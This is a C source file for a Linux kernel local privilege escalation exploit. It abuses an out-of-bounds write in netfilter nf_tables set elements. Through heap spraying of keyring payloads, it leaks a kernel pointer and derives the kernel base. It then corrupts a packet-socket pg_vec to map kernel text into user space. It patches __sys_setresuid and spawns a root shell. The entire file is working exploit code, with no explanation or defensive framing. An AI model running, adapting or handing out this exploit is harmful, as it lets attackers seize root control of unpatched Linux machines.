#define _GNU_SOURCE
#include <arpa/inet.h>
#include <limits.h>
#include <linux/netlink.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>

#include "common.h"
#include "kernel_offset.h"
#include "keyring.h"
#include "log.h"
#include "nf_tables.h"
#include "raw_packet.h"

#define ID 1337
#define SET_NAME "nameXXX"
#define LEAK_SET_NAME "leakXXX"
#define TABLE_NAME "tableXX"

struct leak_payload {
    uint8_t prefix[PREFIX_BUF_LEN];
    uint8_t rcu_buf[RCU_HEAD_LEN];
    uint16_t len;
} __attribute__((packed));

struct write_payload {
    uint8_t prefix[PREFIX_BUF_LEN];
    void *pg_vec;
} __attribute__((packed));

int netfilter_sock = -1;
uint64_t leak_ptr;
uint64_t kbase;

void init_netfilter(void) {
    struct sockaddr_nl snl;

    logd("creating netfilter netlink socket");
    if ((netfilter_sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0) {
        die("can't create netfilter socket: %m");
    }

    memset(&snl, 0, sizeof(snl));
    snl.nl_family = AF_NETLINK;
    snl.nl_pid = getpid();
    if (bind(netfilter_sock, (struct sockaddr *)&snl, sizeof(snl)) < 0) {
        die("bind: %m");
    }

    logd("register netfilter table");
    create_table(netfilter_sock, TABLE_NAME);

    logd("creating a netfilter set for the info leak");
    create_set(netfilter_sock, LEAK_SET_NAME, KMALLOC64_KEYLEN, sizeof(struct leak_payload), TABLE_NAME, ID);

    logd("creating a netfilter set for the write primitive");
    create_set(netfilter_sock, SET_NAME, KMALLOC64_KEYLEN, sizeof(struct write_payload), TABLE_NAME, ID + 1);
}

void do_init(void) {
    set_cpu_affinity(0, 0);
    init_namespace();
    init_netfilter();
}

int do_leak(void) {
    key_serial_t id_buffer[SPRAY_KEY_CNT] = {0};
    key_serial_t corrupted_key_id = 0;

    struct leak_payload leak_payload;
    memset(&leak_payload, 0, sizeof(struct leak_payload));
    leak_payload.len = CORRUPT_SIZE;

retry:
    logd("spraying user_key_payload ...");
    spray_keyring(id_buffer, SPRAY_KEY_CNT);

    logd("free some key to create holes ...");
    for (int i = FREE_HOLE_BEGIN; i < SPRAY_KEY_CNT; i += FREE_HOLE_STEP) {
        release_key(id_buffer[i]);
        id_buffer[i] = 0;
    }

    logd("trigger oob write ...");
    add_elem_to_set(netfilter_sock, LEAK_SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME,
                    ID, sizeof(struct leak_payload), (uint8_t *)&leak_payload);

    logd("checking if keyring is corrupted ...");
    if (is_keyring_corrupted(id_buffer, SPRAY_KEY_CNT, &corrupted_key_id)) {
        logi("found keyring %d is corrupted!", corrupted_key_id);
    } else {
        logw("can't found corrupted keyring, retry ...");
        release_keys(id_buffer, SPRAY_KEY_CNT);
        goto retry;
    }

    logd("free other keyring to set rcu.func in user_key_payload ...");
    for (int i = FREE_HOLE_BEGIN; i < SPRAY_KEY_CNT; i++) {
        if (id_buffer[i] == corrupted_key_id) {
            continue;
        }
        release_key(id_buffer[i]);
        id_buffer[i] = 0;
    }

    logd("searching rcu.func ...");
    leak_ptr = get_keyring_leak(corrupted_key_id); // proc_fs_context_ops
    if (!leak_ptr) {
        loge("leak rcu.func failed");
        for (int i = 0; i < SPRAY_KEY_CNT; i++) {
            release_key(id_buffer[i]);
            id_buffer[i] = 0;
        }
        return 1;
    }

    logi("leak user_free_payload_rcu: 0x%08lx", leak_ptr);

    kbase = leak_ptr - USER_FREE_PAYLOAD_RCU_OFFSET;
    logi("leak kbase: 0x%08lx", kbase);
    if (kbase & 0xFFF) {
        die("wrong offset!");
    }

    return 0;
}

int do_write_primitive(void) {
    int packet_fds[PACKET_SPRAY_CNT] = {0};
    int fengshui_fds[PACKET_FENGSHUI_CNT] = {0};

    struct write_payload payload;
    memset(&payload, 0, sizeof(struct write_payload));
    payload.pg_vec = (void *)((kbase + SYS_SETRESUID_OFFSET) & ~0xfff);

    logd("use raw_packet to fenghsui kmalloc-64 ...");
    for (int i = 0; i < PACKET_FENGSHUI_CNT; i++) {
        fengshui_fds[i] = pagealloc_pad(KMALLOC64_PAGE_CNT, 0x1000);
    }

    logd("spraying pg_vec in kmalloc-64 ...");
    memset(packet_fds, 0, sizeof(packet_fds));
    for (int i = 0; i < PACKET_SPRAY_CNT; i++) {
        packet_fds[i] = pagealloc_pad(KMALLOC64_PAGE_CNT, 0x1000);
    }

    logd("free some pg_vec to create holes ...");
    for (int i = 0; i < PACKET_SPRAY_CNT; i += PACKET_FREE_HOLE_STEP) {
        close(packet_fds[i]);
        packet_fds[i] = 0;
    }

    logd("trigger oob write ...");
    add_elem_to_set(netfilter_sock, SET_NAME, KMALLOC64_KEYLEN, TABLE_NAME,
                    ID, sizeof(struct write_payload), (uint8_t *)&payload);

    logd("searching edited page ...");
    for (int i = 0; i < PACKET_SPRAY_CNT; i++) {
        if (!packet_fds[i]) {
            continue;
        }
        // packet mmap to userland
        char *page = (char *)mmap(NULL, PAGE_SIZE * KMALLOC64_PAGE_CNT,
                                  PROT_READ | PROT_WRITE, MAP_SHARED, packet_fds[i], 0);
        if (!page || (ssize_t)page < 0) {
            loge("mmap error: %p", page);
            continue;
        }
        // search non-empty page
        int j;
        for (j = 0x30; j < 0x1000; j++) {
            if (page[j] != 0) {
                break;
            }
        }
        // found non-empty page
        if (j != 0x1000) {
            logi("found target page!!");
            hexdump(page, 0x100);
            logd("patching __sys_setresuid jne to jmp ...");
            page[(kbase + SYS_SETRESUID_OFFSET + PATCH_JNE_OFFSET) & 0xfff] = 0xeb;
            return 0;
        }
    }

    loge("can't found target page");

    for (int i = 0; i < PACKET_FENGSHUI_CNT; i++) {
        close(fengshui_fds[i]);
    }
    for (int i = 0; i < PACKET_SPRAY_CNT; i++) {
        close(packet_fds[i]);
    }

    return 1;
}

int main(int argc, char **argv) {
    pid_t pid = fork();
    if (!pid) {
        logd("initialize exploit environment ...");
        do_init();

        while (do_leak()) {
            usleep(100 * 1000);
            logw("retry ...");
        }

        while (do_write_primitive()) {
            usleep(100 * 1000);
            logw("retry ...");
        }

        return 0;
    } else {
        int wstatus;
        wait(&wstatus);

        if (WIFEXITED(wstatus) && !WEXITSTATUS(wstatus)) {
            setresuid(0, 0, 0);
            execl("/bin/sh", "sh", NULL);
        }

        return 0;
    }
}
